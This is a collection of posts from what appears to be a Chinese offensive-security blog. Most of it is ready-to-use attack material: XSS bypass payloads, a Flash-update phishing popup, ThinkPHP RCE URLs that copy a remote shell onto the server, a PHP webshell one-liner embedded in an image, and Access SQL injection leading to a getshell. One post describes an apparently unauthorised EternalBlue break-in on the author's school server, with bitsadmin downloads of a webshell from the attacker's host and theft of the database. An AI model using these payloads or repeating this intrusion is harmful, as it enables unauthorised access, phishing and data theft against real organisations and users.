大学期间，个人感觉是进步最快的一个阶段，因为觉得不甘心当个脚本小子，就报了轮子（软件工程）专业，最直接的原因：懂了程序就懂了原理，懂了原理就懂得利用。期间小迪哥的教程（虽然不认识），可以算是我的启蒙老师，让我正式入了门。从杂乱无章的学习到相对系统的认知，这是个我认为最难跨越的阶段，不记得自己到底用了多久，不过一个深切的感觉，越学觉得越菜，越觉得自己不懂得太多。在大学里有幸结识了志同道合的学长学弟，组建了信安社团，参加了一些大大小小CTF比赛，也结识了一些网络上的朋友，互相学习共同进步，真的是见识的人越多，越清楚自己和大佬的差距 (&gt;_&lt;) ，进入了特别想进入的T00ls，圈子等国内知名论坛，见识到了更多的骚操作。 总结一下暂时完成的Flag（毕业之前继续努力）：漏洞平台提交，SRC提交，造轮子，CTF比赛证书，CNVD证书，CVE编号，，，大学完了以后再继续写吧。 路漫漫其修远兮，吾将上下而求索。","link":"/2019/02/18/%E6%88%91%E7%9A%84%E6%A2%A6%E6%83%B3%E6%98%AF%E5%B9%B4%E5%B0%91%E6%9C%89%E4%B8%BA/"},{"title":"某某街一处XSS的绕过思路","text":"众测吃便便 0x01 前言疫情影响，过年放假呆在家里实在无聊，上去某平台看了下众测项目，想着挣点口罩钱 0x02 直接闭合一开始尝试直接去闭合&lt;a&gt;标签，发现 &quot;&gt; 输出时会被实体化编码，遂放弃 0x03 javascript 伪协议因为输出是在&lt;a&gt;标签的 href 里面，所以去尝试伪协议，payload如下： 1javascript:alert(document.domain) 提交后发现，输出的内容直接过滤掉了 javascript: 经过几次尝试，通过以下payload绕过了过滤，成功弹窗 1javas&amp;Tab;cript:alert(1) 不过一个小破弹窗怎么能证明危害 0x04 绕过限制加载外部js直接用了xsshunter的payload，提交点击后，发现执行不能成功 仔细对比下输出的内容和原始内容才发现，输出时所有的字符都强制转换小写了 这里先了解下xss中的 编码问题，eval中支持Unicode编码，最终构造的payload把大写的字母单独编码下即可 最终效果： 0x05 报送结果本来以为好歹能混个中危，结果厂商认为这个点需要点击交互，给了低危。 申诉：评级的时候看下功能点，毕竟本来就是需要点击的业务功能。 厂商反馈：经过讨论，恶意链接为javascript开头利用难度较高，故维持评级低危。 给👴爪巴","link":"/2020/02/06/%E6%9F%90%E6%9F%90%E8%A1%97%E4%B8%80%E5%A4%84XSS%E7%9A%84%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/"},{"title":"水坑攻击|Flash钓鱼弹窗优化版","text":"还是那句话：Flash永远滴神~ 一直想写个界面精致点的Flash钓鱼，奈何各种效果实现起来实在是有点麻烦，正好发现了layer这个牛逼的弹层组件，一开始直接用的图片，几行代码就搞定了，但是还是不够完美，后来发到T00ls大家集思广益，提出了一些非常好的建议，几次修改后才有了如下的最终版。 在线预览：http://flash-pop.se7ensec.cn/ 有人说flash不好用了，感觉分析好对面是干啥的，做好一些自动化、定制化的工作，上线率其实还是挺高的。 项目地址：https://github.com/r00tSe7en/Flash-Pop","link":"/2020/09/14/%E6%B0%B4%E5%9D%91%E6%94%BB%E5%87%BB-Flash%E9%92%93%E9%B1%BC%E5%BC%B9%E7%AA%97%E4%BC%98%E5%8C%96%E7%89%88/"},{"title":"浅析Windows短文件名漏洞","text":"0x01 短文件名的介绍短文件名的由来windows下的短文件名是dos+fat12/fat16时代的产物，又称为8dot3命名法类似于PROGRA1（目录）或者元素周1.exe（文件）这样的名称8是指文件名或目录名的主体部分小于等于8个字符3是指文件名或目录名的扩展部分小于等于3个字符中间以 . 作为分割在FAT16文件系统中，由于FDT中的文件目录登记项只为文件名保留了8个字节，为扩展名保留了3个字节，所以DOS和Windows的用户为文件起名字时要受到8.3格式的限制。 为什么现在Windows系统还存在短文件名这种表示？从win95开始，采用fat32已经支持长文件名，但是为了保持兼容性，保证低版本的程序能正确读取长文件名文件，每当创建新文件或新目录时，系统自动为所有长文件名文件创建了一个对应的短文件名。使这个文件既可以用长文件名寻址，也可以用短文件名寻址。 0x02 Windows演示开启查询：2为开启状态，1为关闭状态fsutil 8dot3name query 文件测试 命名规则1）符合DOS短文件名规则的Windows下的长文件名不变。2）长文件名中的空格，在短文件名中被删除。3）删除空格后的长文件名，若长度大于8个字符，则取前6个字符，后两个字符以”#”代替，其中”#”为数字，数字根据前六个字符相同的文件名的个数顺延。若个数超过10个则取前5个字符，后三个字符以”##”代替，其中”##”为两位数字，若个数大于100也依此规则替换。4）对使用多个”．”隔开的长文件名，取最左端一段转换为短文件名，取最右一段前三个字符为扩展名。 0x03 漏洞利用漏洞环境：一般是iis配上.net的 或者Apache+Windows 以dedecms为例：dedecms里面/data/backupdata/目录里面有织梦的备份文件，而且还是txt格式 根据短文件名的漏洞利用方式：只有前六位字符直接显示，后续字符用~1指代。如果存在多个文件名类似的文件的话（名称前6位必须相同，且后缀名前3位必须相同），其中数字1还可以递增。且后缀名最长只有3位，多余的被截断。 python测试脚本（Python3）：123456789101112131415161718192021222324252627#!/usr/bin/env python# -*- conding:utf-8 -*-import urllib.requestheaders = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0','Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2','Connection': 'close','Upgrade-Insecure-Requests': '1'}url=&quot;localhost/dedeCMS&quot;dir = '/data/backupdata/dede_a~'for i in range(1,6): urls = 'http://'+url + dir + str(i) + '.txt' try: head = urllib.request.Request(urls, headers=headers) data = urllib.request.urlopen(head, timeout=3).getcode() if data == 200: print('########成功########' + urls) else: print('错误' + urls) except Exception as e: print(&quot;访问失败&quot;,urls) print(e) continue 逐一访问测试成功结果后，发现了账号密码： 0x04 漏洞修复通用有效方法：禁用windows系统中的短文件名功能。打开注册表并打开此目录 HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\FileSystem修改 NtfsDisable8dot3NameCreation 的值为1 。修改完成后，需要重启系统生效。 ※需要注意：即使关闭了短文件名功能，也不会删除原有创建过的短文件名。","link":"/2018/11/15/%E6%B5%85%E6%9E%90Windos%E7%9F%AD%E6%96%87%E4%BB%B6%E5%90%8D%E6%BC%8F%E6%B4%9E/"},{"title":"渗透学校某内网服务器","text":"”黑“掉自己的学校，可能是大多数黑阔们学生时代共同的执念。 前言：心血来潮，突然想看看学校有没有能用永恒之蓝打下来的机器，顺便来一波内网渗透，想想上一次测试还是刚爆出永恒之蓝的利用工具的时候，那时候msf都还没整合进去，现在直接就能用msf方便多了。 信息收集：已知 10.10.10.0/24 为学校各种服务器使用的IP 使用MSF中的批量ms17_010验证模块： 123456msf5 &gt; use auxiliary/scanner/smb/smb_ms17_010 msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; set rhosts 10.10.10.0-10.10.10.254rhosts =&gt; 10.10.10.0-10.10.10.254msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; set threads 20threads =&gt; 20msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; exploit 扫描的结果如下 漏洞利用：获取cmdshell经测试IP为10.10.10.104的主机（2008 x64）可以成功利用： 该主机关键信息： 8080 端口运行着tomcat的服务，3389 端口未开放，3306 运行MySQL服务，其他端口暂不考虑。 1234567891011121314151617181920212223242526msf5 &gt; use exploit/windows/smb/ms17_010_eternalblue msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; show optionsModule options (exploit/windows/smb/ms17_010_eternalblue): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS yes The target address range or CIDR identifier RPORT 445 yes The target port (TCP) SMBDomain . no (Optional) The Windows domain to use for authentication SMBPass no (Optional) The password for the specified username SMBUser no (Optional) The username to authenticate as VERIFY_ARCH true yes Check if remote architecture matches exploit Target. VERIFY_TARGET true yes Check if remote OS matches exploit Target.Exploit target: Id Name -- ---- 0 Windows 7 and Server 2008 R2 (x64) All Service Packsmsf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set rhosts 10.10.10.104rhosts =&gt; 10.10.10.104msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; run 如下图成功返回了一个CmdShell，而且还直接是System权限，不过比较疑惑的是，tasklist /SVC 看了下当前进程，有360的主动防御，按道理应该会拦截住的，可能我运气好吧2333： cmdshell升级meterpreter（失败）由于cmdshell不如meterpreter好用（meterpreter功能比较强大），尝试升级成meterpreter 第一种方法： 123456789101112131415msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; use post/multi/manage/shell_to_meterpreter msf5 post(multi/manage/shell_to_meterpreter) &gt; show optionsModule options (post/multi/manage/shell_to_meterpreter): Name Current Setting Required Description ---- --------------- -------- ----------- HANDLER true yes Start an exploit/multi/handler to receive the connection LHOST no IP of host that will receive the connection from the payload (Will try to auto detect). LPORT 4433 yes Port for payload to connect to. SESSION yes The session to run this module on.msf5 post(multi/manage/shell_to_meterpreter) &gt; set session 1session =&gt; 1msf5 post(multi/manage/shell_to_meterpreter) &gt; run 第二种方法： 1sessions -u 1 然后不知道为什么失败了（换个思路吧）： 远程文件下载：windows自带的远程文件下载功能很强大，需要用什么就远程下载什么好了。 一开始就想直接开端口，加账号登陆，没想到远程连接出现问题了，然后又想到可以拿下shell试试 开启远程连接本机开一个apache服务，把 3389.bat 放到 /var/www/html 下，cmdshell 里执行，下载成功后，运行3389.bat 1bitsadmin /transfer n http://IP/open3389.bat c:\\windows\\3389.bat 运行完毕后(记得删除)，发现3389端口已经开启了 Kali下连接远程桌面出了点小问题，百度了下，也没讲多清楚（暂时就放弃了）。 不过后来换到win系统上好像就没问题了，因为当时就想着还是怎么方便怎么来（实体机运行的kali，换回win还得切系统），也就没抓密码。 尝试GetShell先找到web所在目录(带空格的目录记得用双引号)： 1234dir c:\\dir &quot;c:\\Program Files\\&quot;...dir &quot;c:\\Program Files\\Apache Software Foundation\\Tomcat 7.0\\webapps\\eleServer\\&quot; 看后台应该是个电力管理系统： 最后决定将shell放在该系统ui框架的某目录下了 同样用远程文件下载jsp大马到该目录下 1bitsadmin /transfer n http://IP/xieying.jsp &quot;c:\\Program Files\\Apache Software Foundation\\Tomcat 7.0\\webapps\\eleServer\\BJUI\\plugins\\xieying.jsp&quot; 浏览器上访问大马并登陆： 结束感觉再弄无非就是远程登陆，没什么必要，翻了翻系统文件，就把这个电力系统的war包，还有备份的数据库拿了下来，本地自己搭建下，应该就能得到系统的账号密码了。 删了shell，我还是个听话的好学生。","link":"/2019/04/01/%E6%B8%97%E9%80%8F%E5%AD%A6%E6%A0%A1%E6%9F%90%E5%86%85%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"title":"渗透记实|ThinkPhp绕过限制GetShell","text":"文章首发无法溯源安全团队公众号 0x01 前言项目里遇到一个站，用的是ThinkPHP V5.0.*框架，且开启了debug模式，本以为一发payload的就能解决的事情，没想到拿下的过程还得小绕一下… 0x02 踩坑 尝试命令执行，system被限制了 尝试包含日志文件，open_basedir限制了 这里有个思路，可以去包含runtime下的日志文件，但是thinkphp的日志文件比较大，而且有时候会有很多奇怪的问题阻断代码执行，暂且作为备选方案 尝试通过thinkphp本身Library中设置Session的方法把脚本写入tmp目录里的Session文件，然后进行包含 1_method=__construct&amp;filter[]=think\\Session::set&amp;method=get&amp;server[REQUEST_METHOD]=&lt;? phpinfo();?&gt; 但是。。。 0x03 GetShell俗话说，三个臭皮匠顶一个诸葛亮，求助师傅们后，给出了解决的办法 Noel 师傅的解决方法及分析： Request.php的filtervalue函数下存在call_user_func,根据Payload，跟踪下流程 首先会进入App.php的Run方法 12345678910111213141516171819202122232425public static function run(Request $request = null){ ……………………………… // 未设置调度信息则进行 URL 路由检测 if (empty($dispatch)) { /*执行当前类的routeCheck方法,获取调度信息,如访问index模块下index控制器里的index方法,则 $dispatch = array(2) { [&quot;type&quot;]=&gt; string(6) &quot;module&quot; [&quot;module&quot;]=&gt; array(3) { [0]=&gt; string(5) &quot;index&quot; [1]=&gt; string(5) &quot;index&quot; [2]=&gt; string(5) &quot;index&quot; } } */ $dispatch = self::routeCheck($request, $config); } // 记录当前调度信息 将获取的调度信息,即模块,控制器,方法名存入Request类的dispatch属性中 $request-&gt;dispatch($dispatch); // 记录路由和请求信息 调式模式,在\\application\\config.php 参数app_debug可配置 if (self::$debug) { Log::record('[ ROUTE ] ' . var_export($dispatch, true), 'info'); Log::record('[ HEADER ] ' . var_export($request-&gt;header(), true), 'info'); Log::record('[ PARAM ] ' . var_export($request-&gt;param(), true), 'info'); } ………………………………} 这里我们主要关注routeCheck和param两个函数，先看routeCheck 12345678public static function routeCheck($request, array $config) { $path = $request-&gt;path(); $depr = $config['pathinfo_depr']; $result = false; ……………………………… // 路由检测（根据路由定义返回不同的URL调度） $result = Route::check($request, $path, $depr, $config['url_domain_deploy']); 主要是将请求参数什么的传入，经过check后就基本上都处理好了 在调试模式开启的情况下可以进入param函数 1234567if (empty($this-&gt;param)) { $method = $this-&gt;method(true); ...... $this-&gt;param = array_merge($this-&gt;get(false), $vars, $this-&gt;route(false));}return $this-&gt;input($this-&gt;param, $name, $default, $filter); 跟进input函数 1234567891011 public function input($data = [], $name = '', $default = null, $filter = '') {...... $filter = $this-&gt;getFilter($filter, $default); if (is_array($data)) { array_walk_recursive($data, [$this, 'filterValue'], $filter); reset($data); } else { $this-&gt;filterValue($data, $name, $filter); } getFilter取出filter的值，在这里也就是assert array_walk_recursive array_walk_recursive() 函数对数组中的每个元素应用用户自定义函数。在函数中，数组的键名和键值是参数。该函数与 array_walk() 函数的不同在于可以操作更深的数组（一个数组中包含另一个数组）。 及对$data的每一个元素应用filterValue函数，跟进filterValue 12345678function filterValue(&amp;$value, $key, $filters){ ...... if (is_callable($filter)) { // 调用函数或者方法过滤 $value = call_user_func($filter, $value); }......} 铳梦师傅的解决方法及分析： payload参考： 来自：https://xz.aliyun.com/t/3570#toc-4 1http://127.0.0.1/index.php?s=index/think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][]=phpinfo() 执行phpinfo（这里注意看 ?s= 后的参数） 1https://127.0.0.1/?s=../\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][]=phpinfo() 拿shell 1https://127.0.0.1/?s=../\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][]=copy('http://127.0.0.1/shell.txt','test.php') 为什么要这么构造呢，给出当前的目录情况以及分析： Route.php的parseUrl函数会对url进行处理 1234567private static function parseUrl($url, $depr = '/', $autoSearch = false) { ....... $url = str_replace($depr, '|', $url); list($path, $var) = self::parseUrlPath($url); ...... } 首先将url中的/替换为|之后是parseUrlPath将url分割 1234567891011121314151617private static function parseUrlPath($url) { // 分隔符替换 确保路由定义使用统一的分隔符 $url = str_replace('|', '/', $url); $url = trim($url, '/'); $var = []; if (false !== strpos($url, '?')) { ...... ...... } elseif (strpos($url, '/')) { // [模块/控制器/操作] $path = explode('/', $url); } else { ...... } return [$path, $var]; } 得到如下三部分 模块加载时Loder.php下的parseName函数 1234567891011public static function parseName($name, $type = 0, $ucfirst = true){ if ($type) { $name = preg_replace_callback('/_([a-zA-Z])/', function ($match) { return strtoupper($match[1]); }, $name); return $ucfirst ? ucfirst($name) : lcfirst($name); } else { return strtolower(trim(preg_replace(&quot;/[A-Z]/&quot;, &quot;_\\\\0&quot;, $name), &quot;_&quot;)); }} 现在就会实例化\\Think\\app类并执行invokefunction方法 所以加../\\的原因是可以再往前跳一层 0x04 bypass disable_functions查看禁用 一开始没仔细看禁用的内容，直接就用了这个 https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD 但是发现putenv被禁用了 换个方法，通过这篇文章 https://mochazz.github.io/2018/09/27/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E7%BB%95%E8%BF%87PHP%E7%9A%84disable_functions/ 了解到利用pcntl扩展，确认系统支持 最终成功执行命令","link":"/2020/02/14/%E6%B8%97%E9%80%8F%E8%AE%B0%E5%AE%9EThinkPhp%E7%BB%95%E8%BF%87%E9%99%90%E5%88%B6GetShell/"},{"title":"端口渗透总结","text":"常见的端口-服务-攻击方向参考：端口渗透总结 文件共享服务端口 端口号 端口说明 攻击方向 21/22/69 Ftp/TFtp文件传输协议 匿名上传、下载、爆破和嗅探 2049 Nfs服务 配置不当 139 Samba服务 爆破、未授权访问、远程代码执行 389 Ldap目录访问协议 注入允许、匿名访问、弱口令 远程链接服务端口 端口号 端口说明 攻击方向 22 SSH远程连接 爆破、SSH隧道及内网代理转发、文件传输 23 Telnet远程连接 爆破、嗅探、弱口令 3389 Rdp远程桌面连接 Shift后门(Win sever 2003以下系统)、爆破 5900 VNC 弱口令爆破 5632 PyAnywhere服务 抓密码、代码执行 Web应用服务端口 端口号 端口说明 攻击方向 80/443/8080 常见web服务端口 web攻击、爆破、对应服务器版本漏洞 7001/7002 weblogic控制台 Java反序列化、弱口令 8080/8089 Jboss/Resin?Jetty/Jenkins 反序列化、控制台弱口令 9090 WebShphere控制台 Java反序列化、弱口令 4848 GlassFish控制台 弱口令 1352 Lotus domino邮件服务 弱口令、信息泄露、爆破 10000 Webmin-Web控制面板 弱口令 数据库服务端口 端口号 端口说明 攻击方向 3306 Mysql 注入、提权、爆破 1433 MSSQL数据库 注入、提权、SA弱口令、爆破 1521 Oracle数据库 TNS爆破、注入、反弹Shell 5432 PostgreSQL 爆破、注入、弱口令 27017/27018 MongoDB 爆破、未授权访问 6379 Redis数据库 可尝试未授权访问、弱口令、爆破 5000 SysBase/DB2数据库 爆破、注入 邮件服务端口 端口号 端口说明 攻击方向 25 SMTP邮件服务 邮件伪造 110 POP3协议 爆破、嗅探 143 IMAP协议 爆破 网络常见协议端口 端口号 端口说明 攻击方向 53 DNS域名系统 允许区域传送、DNS劫持、缓存投毒、欺骗 67/68 DHCP服务 劫持、欺骗 161 SNMP协议 爆破、搜集目标内网信息 特殊服务端口 端口号 端口说明 攻击方向 2181 Zookeeper服务 未授权访问 8069 Zabbix服务 远程执行、SQL注入 9200/9300 Elastcsearch服务 远程执行 11211 Memcache服务 未授权访问 512/513/514 Linux Rexec服务 爆破、Rlogin登陆 873 Rsync服务 匿名访问、文件上传 6390 Svn服务 Svn泄露、未授权访问 50000 SAPManagement Console 远程代码执行","link":"/2018/11/28/%E7%AB%AF%E5%8F%A3%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/"},{"title":"在线肾透测试中心","text":"“成就他人是一个伟大的行为，我将贯彻到底。” ——hl0rey 作为天天肾透，日日肾虚的我们，常常需要借助各种各样的在线网站来进行信息收集、加密解密、数据处理… 随着浏览器收藏夹分类越来越多，找到网址然后打开得操作越来越觉得麻烦，便花了一些时间来整理了下做成了一个导航页，页面内容不定期会保持更新。 也不用担心某一类型重复得网站太多，不知道用哪个好，基本上贴上去得我自己全部都使用过，备注 ”推荐“ 的就是用起来感觉不错得。 个人认为通过在线网站各种功能，完成信息收集60%的工作是完全没问题的，希望可以对看文章的你有所帮助~ 在线工具 - 肾透测试中心 - https://gitbook.se7ensec.cn/","link":"/2020/08/24/%E8%82%BE%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83/"},{"title":"自动化信息收集工具的实现","text":"作为一个专业的渗透测试人员，自动化信息收集工具是必不可少的。 初衷起因一次对某大型目标的渗透，需要对几百个根域进行信息收集工作，在繁杂的信息收集工作中，重复而又单调的操作会极大消耗我们的耐心，人工去做这个事情的话非常不现实的。 于是花了周末两天的时间，做了下众多扫描器的调研，大部分环境配置麻烦不说且系统过于笨重，使用起来十分不方便。 在权衡了系统资源消耗，硬件要求，程序人工可干预性、以及后期代码维护的成本，最终用Python + Shell实现了雏形版本，参考了一下InCloud GitHub云上扫描器 的部分思路，勉强完成了一些基础工具的整合，一些细节的处理都不太完善。 如今经过一年多时间的打磨，基本可以覆盖到信息收集的每一个阶段。 7{.}s{.}c{.}a{.}n [资产收集] 未开源 我对它的定义是 “ 轻量、简洁、可扩展、可自定义、基于实战优化后的参数设置”，下面放一个程序运行流程的思维导图。 Nuclei+Xray [漏扫集成]后续的web漏洞主动探测使用nuclei + xray nucleiFast and customizable vulnerability scanner based on simple YAML based DSL. https://github.com/projectdiscovery/nuclei 1nuclei -t /root/nuclei-templates/ -severity critical,high,medium -l all_active_webs.txt -bs 50 -c 50 -rl 150 -nc | anew -q all_nuclei_output.txt xray多线程调用xray+rad进行自动扫描 https://github.com/sv3nbeast/X-AutoXray 1python3 X-AutoXray.py all/all_active_webs.txt all/all_xray_result/ Search_Server [资产整合] 未开源 后期使用发现，Web资产多了看起来非常乱，不够直观。 于是基于Python Flask实现了一个程序，以网页形式整合httpx + gowitness的探测结果，支持 任意单列排序、任意单列搜索、全局搜索（这里要感谢下：@me1ons 实现的此功能）、行数统计、截图相似度排序。 CobWeb [资产可视化] 已开源：https://github.com/r00tSe7en/cobweb 后期使用发现，大型目标收集到的子域名和解析IP的关系错综复杂，肉眼分析起来费时又费力。 CobWeb蛛网 将关联数据进行可视化显示，方便快速定位目标资产。 测试页：https://www.se7ensec.cn/cobweb/ 网络显示关系可拖动 可手动屏蔽选单独立高亮显示 感谢https://github.com/shmilylty/OneForAll https://github.com/projectdiscovery/subfinder https://github.com/boy-hack/ksubdomain https://github.com/lijiejie/subDomainsBrute https://github.com/cgboal/sonarsearch https://github.com/projectdiscovery/dnsx https://github.com/zu1k/nali https://github.com/projectdiscovery/naabu https://github.com/projectdiscovery/httpx https://github.com/P1kAju/httpx https://github.com/adamgordonbell/csvquote https://github.com/projectdiscovery/nuclei https://github.com/soimort/translate-shell https://github.com/sensepost/gowitness https://github.com/lcvvvv/kscan https://github.com/tomnomnom/anew https://github.com/lc/gau https://github.com/six2dez/ipcdn https://github.com/ThreatUnkown/jsubfinder https://github.com/ProjectAnte/dnsgen https://github.com/sv3nbeast/X-AutoXray","link":"/2023/02/14/%E8%87%AA%E5%8A%A8%E5%8C%96%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%9E%E7%8E%B0/"},{"title":"解析漏洞汇总","text":"※什么是解析漏洞？ 简单的说，解析漏洞就是web容器将其他格式的文件解析为可执行脚本语言，攻击者可以利用这个特征去执行一些攻击行为。 IIS 解析漏洞※使用IIS6.0的服务器，一般是Windows server 2003，解析语言是asp，不能解析aspx语言 IIS6.0 在解析文件时存在以下两个解析漏洞 目录解析：当建立 .asa ，.asp 格式的文件夹时，其目录下的任意文件都将被 IIS 当作 asp 文件来解析 后缀解析：在 IIS6.0 下，分号”;”后面的扩展名不会被解析，也就是说当文件为 *.asp;.jpg 时，IIS6.0 同样会以 ASP脚本来执行 默认解析：其他可执行文件格式 1234*.asa*.cer*.cdx（这种格式也会解析，但是和版本有关）*.asa 此处可联系利用目录解析漏洞 /xx.asa/xx.jpg 或 /xx.cer/xx.jpg 或 xx.asa;.jpg Apache 解析漏洞在 Apache 1.x 和 Apache 2.x 中存在解析漏洞 , 但他们与 IIS 解析漏洞不同 Apache 在解析文件时有一个规则： 当碰到不认识的扩展名时，将会从后向前解析，直到碰到认识的扩展名位置，如果都不认识，则会暴露其源码，比如： 1test.php.rar.xx.aa Apache 首先会解析 aa 扩展名，如果不认识则接着解析 xx 扩展名，这样一直遍历到认识的扩展名为止，然后再将其进行解析 PHP CGI 解析漏洞在PHP的配置文件中有一个关键的选项 [Fast-CGI]：cgi.fix_pathinfo=1 这个选项在某些版本是默认开启的，在开启时访问 url 比如：http://www.xxx.com/x.txt/x.php ，x.php 是不存在的文件，所以 php 将会向前递归解析，于是就造成了解析漏洞 由于这种漏洞常见于 IIS7.0 、 IIS7.5 、 Nginx 等 Web服务器，所以经常会被误认为是这些 Web服务器的解析漏洞 常用利用方法： 将一张图和一个写入后门代码的文本文件合并 将恶意文本写入图片的二进制代码之后，避免破坏图片文件头和尾 1234567copy xx.jpg/b + yy.txt/a xy.jpg/b 即二进制[binary]模式/a 即ascii模式 xx.jpg正常图片文件 yy.txt 内容 &lt;?PHP fputs(fopen('shell.php','w'),'&lt;?php eval($_POST[cmd])?&gt;');?&gt;意思为写入一个内容为 &lt;?php eval($_POST[cmd])?&gt; 名称为shell.php的文件找个地方上传 xy.jpg ,然后找到 xy.jpg 的地址，在地址后加上 /xx.php 即可执行恶意文本。然后就在图片目录下生成一句话木马 shell.php 密码 cmd 经验之谈：php|php3|php5|phtml 多可被Apache解析 Nginx &lt;8.03 空字节代码执行漏洞在Fast-CGI关闭的情况下，Nginx &lt;8.03依然存在解析漏洞 影响版本：0.5，0.6，0.7&lt;=0.7.65，0.8&lt;=0.8.37 Nginx 在图片中嵌入PHP代码 , 然后通过访问 xxx.jpg%00.php 可以执行其中的代码 其他在 windows 环境下， xx.jpg[ 空格 ] 或 xx.jpg，这两类文件都是不允许存在的，若这样命名 windows 会默认除去空格或点， 攻击者可以通过抓包，在文件名后加一个空格或者点绕过黑名单 若上传成功，空格和点都会被 windows 自动消除，这样也可以 getshell 如果在 Apache 中 htaccess 可被执行，且可被上传。那可以尝试在 .htaccess 中写入 ： 1SetHandlerapplication/x-httpd-php 然后再上传名称为 shell.jpg 的 webshell， 这样 shell.jpg 就可解析为 php 文件","link":"/2019/01/03/%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/"},{"title":"记一次Access偏移注入","text":"足够猥琐的思路，往往能带来意想不到的效果。 前言一直想找个目标站，练习一下Access的偏移注入，今天遇见个站，用Sqlmap只能跑出来表名，好的就它了。 已知表名：tbladmin 偏移注入判断字段数1order by 12 爆出显示位1union select 1,2,3,4,5,6,7,8,9,10,11,12 from tbladmin 使用偏移注入由于列名猜解不出来（后面有猥琐思路），所以使用偏移注入 1234union select 1,2,3,4,5,6,7,8,9,10,11,12,* from tbladmin - 报错union select 1,2,3,4,5,6,7,8,9,10,11,* from tbladmin - 报错....union select 1,2,3,4,5,6,7,8,* from tbladmin - 正常 说明了tbladmin表下有8个字段, * 代表了所有字段，比如查 tbladmin 表，它有几个字段，那么 * 就代表几个字段 偏移注入的基本公式*order by 出来的字段数减去 * 号前的字段数，然后再用order by 出来的字段数减去2倍刚才得出来的答案* 1即 12-8=4 ，12-2*4=4 关于为什么要减去乘2的问题：由于这个(tbladmin as a inner join tbladmin as b on a.id=b.id)是tbladmin表自连接的，这样from 后面的表就会成为字段数加倍的表 这样就可以使 * 代表的字段拓宽，加大账号，密码在显示位出现的几率 1union select 1,2,3,4,* from (tbladmin as a inner join tbladmin as b on a.id=b.id) 当前字段数已经为：4+4*2 = 12 = 12，这条语句显然是合法的 现在可以看到，只出现了账号admin，我们还需要密码，所以继续打乱顺序 12union select 1,2,3,4,a.id,* from (tbladmin as a inner join tbladmin as b on a.id=b.id) - 页面无变化union select 1,2,3,4,a.id,b.id,* from (tbladmin as a inner join tbladmin as b on a.id=b.id) - admin变成1 这里有个偏移注入的核心问题当前字段数已经为：4+2+4*2 = 14 &gt; 12，但这条语句却依然是合法的，为什么呢？ 因为 a.id 和 b.id 在 * 里是有的，所以计算机会自动去掉重复的， 保持集合里元素的唯一性，这样一来最终查询效果的一样，但是里面字段排列顺序却被打乱了，所以才造成了偏移注入的产生。 目前我们已经进行了两次打乱，但是密码还是没有偏移到可显示的位置，这时，我们就需要继续来打乱顺序 1union select a.id,b.id,c.id,* from ((tbladmin as a inner join tbladmin as b on a.id=b.id) inner join tbladmin as c on a.id=c.id) 当前字段数已经为：0+4*3 = 12 = 12，所以这条语句还是合法的 继续打乱 1union select a.id,b.id,* from ((tbladmin as a inner join tbladmin as b on a.id=b.id) inner join tbladmin as c on a.id=c.id) 1union select a.id,* from ((tbladmin as a inner join tbladmin as b on a.id=b.id) inner join tbladmin as c on a.id=c.id) 至此，成功完成，拿去解密发现，WTF，解不出来。。。： 联合注入（猥琐）有时候渗透的思路真是要猥琐至极才好，我沉思了几分钟之后，灵光一闪，掏出了我的御剑珍藏版，扫出了后台（为什么这里要写出来呢，感觉可以算是一种思路） 看下登陆框源码凭借我多年老司机的经验，这个名字就有可能是列名了： 直接联合查询1union select 1,admin_name,admin_pass,4,5,6,7,8,9,10,11,12 from tbladmin 登陆后台+GetShell但是现在出来依然是admin，直接在Sqlmap里面把表名，列名都指定出来，去dump看看还有没有其他账户 1sqlmap.py -u url -T tbladmin -C admin_name,admin_pass --dump 发现ljy账户的密码是可以解密的，成功登陆后台，找到一处任意文件上传成功getshell： { 顺带说一下，这个文件上传链接固定，且不需要登陆，是一个通杀，凡是使用该程序的站点，基本都可以秒下来。} 这次又是个内网的机器，最近遇到的有点多，用了几个新出的exp，提权失败了，反弹msf也没成功。。。暂时放弃","link":"/2019/03/10/%E8%AE%B0%E4%B8%80%E6%AC%A1Access%E5%81%8F%E7%A7%BB%E6%B3%A8%E5%85%A5/"},{"title":"记一次曲折的报错注入","text":"机缘巧合，查询旁站时随手点开的一个网站，加单引号 ' 页面报错，同时爆出的还有sql查询语句，程序版本ThinkPHP V5.0.14，测试了下前一阵子爆出来的exp，应该也是修复了。 尝试联合查询注入首先尝试闭合，构造注入语句： 12345http://xxx.com/pc/category/index/id/48) %23.html - 正常显示，闭合成功http://xxx.com/pc/category/index/id/48) and '1'='1' %23.html - 正常显示http://xxx.com/pc/category/index/id/48) and '1'='2' %23.html - 页面报错http://xxx.com/pc/category/index/id/48) order by 1 %23.html - order by 1 正常http://xxx.com/pc/category/index/id/48) order by 2 %23.html - order by 2 出现谜之报错，纠结了一阵 1http://xxx.com/pc/category/index/id/48) order by (2.html - 这样构造就可以正常了，测试最大为30 失败联合查询来一下试试，报错了，之后尝试各种方法去闭合均报错，只好暂时放弃了，没了头绪 